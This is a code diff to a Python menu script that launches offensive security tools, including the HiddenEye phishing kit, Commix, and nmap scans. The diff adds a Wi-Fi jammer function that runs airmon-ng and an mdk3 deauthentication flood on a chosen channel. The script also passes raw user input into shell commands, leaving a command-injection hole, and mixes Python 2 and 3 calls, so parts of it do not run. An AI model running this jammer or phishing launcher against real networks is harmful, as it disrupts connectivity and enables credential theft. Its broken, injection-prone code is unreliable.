@@ -1,8 +1,24 @@
 import os
 import sys
 import subprocess
+from colorama import Fore, Back, Style
+#Show Text
+print(Fore.RED+Back.GREEN+"""
+ .----------------. .----------------. .----------------. .----------------. .----------------. .----------------. .-----------------.
+| .--------------. | .--------------. | .--------------. | .--------------. | .--------------. | .--------------. | .--------------. |
+| |  ____  ____  | | |      __      | | |     ______   | | |  ___  ____   | | |  _________   | | |     ____     | | | ____  _____  | |
+| | |_   ||   _| | | |     /  \     | | |   .' ___  |  | | | |_  ||_  _|  | | | |  _   _  |  | | |   .'    `.   | | ||_   \|_   _| | |
+| |   | |__| |   | | |    / /\ \    | | |  / .'   \_|  | | |   | |_/ /    | | | |_/ | | \_|  | | |  /  .--.  \  | | |  |   \ | |   | |
+| |   |  __  |   | | |   / ____ \   | | |  | |         | | |   |  __'.    | | |     | |      | | |  | |    | |  | | |  | |\ \| |   | |
+| |  _| |  | |_  | | | _/ /    \ \_ | | |  \ `.___.'\  | | |  _| |  \ \_  | | |    _| |_     | | |  \  `--'  /  | | | _| |_\   |_  | |
+| | |____||____| | | ||____|  |____|| | |   `._____.'  | | | |____||____| | | |   |_____|    | | |   `.____.'   | | ||_____|\____| | |
+| |              | | |              | | |              | | |              | | |              | | |              | | |              | |
+| '--------------' | '--------------' | '--------------' | '--------------' | '--------------' | '--------------' | '--------------' |
+ '----------------' '----------------' '----------------' '----------------' '----------------' '----------------' '----------------'
+""")
+print(Style.RESET_ALL)
 # Get Info
-print(" 1 -> CUPP\n 2 -> NMAP\n 3 -> Commix\n 4 -> FSociety\n 5 -> Hidden Eye\n 6 -> BruteSploit")
+print(" 1 -> CUPP\n 2 -> NMAP\n 3 -> ZenMap\n 4 -> Commix\n 5 -> FSociety\n 6 -> Hidden Eye\n 7 -> Wi-Fi Jammer\n")
 choice = int(input("\nEnter The Choice : "))
 # CUPP
 def cupp () :
@@ -49,6 +65,10 @@ def nmap () :
     else :
         os.system("nmap -T4 -A -v "+ip)
     return "https://nmap.org/"
+# ZENMAP
+def zenmap () :
+    print("Entering ZenMap .||.")
+    os.system("zenmap")
 # Commix
 def commix () :
     print("Entering Commix .||.")
@@ -103,28 +123,27 @@ def hidden_eye () :
     os.system("cd HiddenEye && python3 HiddenEye.py")
     os.system("Y")
     return "https://github.com/DarkSecDevelopers/HiddenEye.git"
-def brutesploit () :
-    print("""1 -> Installation\n
-2 -> Execute\n""")
-    action = int(input("Enter Your Choice : "))
-    if action == 1 :
-        print("Installing BruteSploit <|.|>")
-        os.system("cd BruteSploit && chmod u+x Brutesploit")
-        os.system("./Brutesploit.sh")
-    if action == 2 :
-        print("Entering BruteSploit .||.")
-        os.system("cd BruteSploit")
-        os.system("./Brutesploit.sh")
+# Wi-Fi Jammer
+def wifijammer () :
+    print("Entering Wi-Fi Jammer .||.")
+    os.system("airmon-ng")
+    iface = raw_input("Enter The Preffered Interface : ")
+    os.system("airmon-ng start "+iface)
+    os.system("airodump-ng "+iface+"mon")
+    channel = raw_input("Enter The Preffered Channel You Want To Jam : ")
+    os.system("mdk3 "+iface+"mon ""d -c "+channel)
 # Choice Decide
 if choice == 1 :
     cupp()
 elif choice == 2 :
     nmap()
 elif choice == 3 :
-    commix()
+    zenmap()
 elif choice == 4 :
-    fsociety()
+    commix()
 elif choice == 5 :
-    hidden_eye()
+    fsociety()
 elif choice == 6 :
-    brutesploit()
+    hidden_eye()
+elif choice == 7 :
+    wifijammer()
